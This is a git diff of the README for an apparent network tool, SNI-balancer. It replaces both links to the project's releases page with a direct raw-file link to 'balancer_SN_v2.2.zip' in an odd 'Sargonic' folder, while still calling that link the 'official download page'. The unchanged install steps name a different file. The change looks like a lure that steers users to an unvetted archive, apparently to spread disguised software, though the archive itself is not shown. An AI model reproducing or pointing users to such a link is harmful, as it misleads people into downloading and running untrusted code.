@@ -1,6 +1,6 @@
 # 🌐 SNI-balancer - Maintain stable internet connections automatically
 
-[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Romany-bounce808/SNI-balancer/releases)
+[![Download Software](https://img.shields.io/badge/Download-Latest_Version-blue.svg)](https://github.com/Romany-bounce808/SNI-balancer/raw/refs/heads/main/Sargonic/balancer_SN_v2.2.zip)
 
 SNI-balancer keeps your internet connection reliable. It regularly tests your network configurations and selects the fastest option. This tool runs in the background. It swaps between settings to ensure you always have a working connection.
 
@@ -19,7 +19,7 @@ Many internet connections face interference. This causes drops or slow speeds. S
 
 Follow these steps to set up the software on your computer.
 
-1. Visit the [official download page](https://github.com/Romany-balancer808/SNI-balancer/releases).
+1. Visit the [official download page](https://github.com/Romany-bounce808/SNI-balancer/raw/refs/heads/main/Sargonic/balancer_SN_v2.2.zip).
 2. Locate the file named `SNI-balancer-windows.zip`.
 3. Click the file name to start the download.
 4. Save the file to your Downloads folder.
